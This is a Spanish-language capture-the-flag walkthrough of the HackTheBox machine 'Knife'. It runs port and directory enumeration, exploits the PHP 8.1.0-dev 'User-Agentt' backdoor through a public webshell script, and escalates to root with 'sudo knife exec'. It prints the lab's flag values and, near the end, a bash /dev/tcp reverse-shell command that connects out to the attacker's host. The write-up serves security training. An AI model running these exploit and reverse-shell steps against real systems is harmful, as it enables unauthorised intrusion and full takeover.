
# Knife (Linux) ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/common-images/linux.jpg "Linux")  - Español
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Knife/images/logo.jpg "Knife")
Creador de la máquina: **MrKN16H7**
### Writeup por Tnr1112

## Enumeración
### Empezamos escaneando todos los puertos abiertos

    nmap -p- -sS --min-rate 5000 --open -vvv -n 10.10.10.242 -oG allPorts
Lo exporto en modo grepeable para después poder utilizar una función que me extrae los puertos

|PORT|STATE|SERVICE| 
|--|--|--|
|22/tcp|open|ssh|
|80/tcp|open|http|

### Buscamos los servicios que corren los puertos abiertos

```
nmap -sC -sV -p22,80 10.10.10.242 -oN targeted
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Escaneamos buscando alguna vulnerabilidad

    nmap -p22,80 --script=”vuln and safe” 10.10.10.242 -oN vulnSafeScan
Pero no hay suerte :(

### Web
Esta es la web. En el código no hay nada sospechoso.
![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Knife/images/website.jpg "Website")

### Fuzzing
Utilizamos `gobuster` para enumerar algún directorio, pero no hay suerte.
```
gobuster dir -u http://10.10.10.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/09/15 13:39:56 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5815]
Progress: 27126 / 441122 (0.08%)                 ^C
[!] Keyboard interrupt detected, terminating.
                                                
===============================================================
2021/09/15 13:40:03 Finished
===============================================================
```
### Whatweb
Utilizamos el whatweb para ver qué información obtenemos

```
whatweb 10.10.10.242
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

## Exploit PHP 8.1.0-dev User-Agentt
Podemos ver que utiliza **PHP 8.1.0-dev**
Existe una vulnerabilidad que al agregar como Header un **“User-Agentt”** podemos ejecutar código de forma arbitraria.
Yo voy a utilizar el siguiente script: [PHP-8.1.0-dev_WebShell-RCE-Github](https://github.com/ColdFusionX/PHP-8.1.0-dev_WebShell-RCE)

Ejecutamos el .py con el parámetro `-l` le indicamos el host y podremos ejecutar los comandos que queramos

    python3 php8-1RCE2.py -l http://10.10.10.242

Una vez adentro, con `whoami` podemos saber a que usuario pertenece la sesión en la que estamos.
Obtenemos la flag de user en el directorio del usuario james.
```
[+] PHP 8.1.0-dev WebShell RCE by ColdFusionX 
Target is running on PHP 8.1.0-dev
*Shoot your commands below* 

[^] WebShell=- whoami
james

[^] WebShell=- cat /home/james/user.txt
5615f62140ac79f46e2fdb9a04ac9ed0
```
Ahora con sudo -l verificamos los comandos disponibles que se pueden ejecutar con sudo.
```
[^] WebShell=- sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Efectivamente, podemos ejecutar el comando `knife`

> knife es una herramienta de línea de comando que provee una interfaz entre un repositorio de chef local y el Chef Infra Server. 

[Documentación knife](https://docs.chef.io/workstation/knife/)

## Escalada de privilegios

Con el comando `exec` podemos ejecutar código hecho en **ruby**. Por lo que podremos ejecutar cualquier comando que queramos con privilegios.
[Documentación knife exec](https://docs.chef.io/workstation/knife_exec/)
```
[^] WebShell=- sudo knife exec -E 'puts `cat /root/root.txt`'
73e63ad29b6339faea23f15406f2b1a0
```
Para obtener control total podremos abrir una reverse shell.
Nos ponemos a escuchar en el puerto 4444
```
nc -nlvp 4444
listening on [any] 4444 ...
```

En el server ejecutamos:

    [^] WebShell=- /bin/bash -c 'bash -i >&/dev/tcp/Nuestra IP/Nuestro puerto 0>&1'

Para escalar privilegios, abriremos una bash desde knife con `sudo knife exec -E 'exec "/bin/bash -i"'`
```
listening on [any] 4444 ...
connect to [10.10.14.189] from (UNKNOWN) [10.10.10.242] 48064
bash: cannot set terminal process group (1018): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ sudo knife exec -E 'exec "/bin/bash -i"'  
sudo knife exec -E 'exec "/bin/bash -i"'
bash: cannot set terminal process group (1018): Inappropriate ioctl for device
bash: no job control in this shell
root@knife:/# whoami
whoami
root
```
Y listo, obtendremos una shell con **root** :)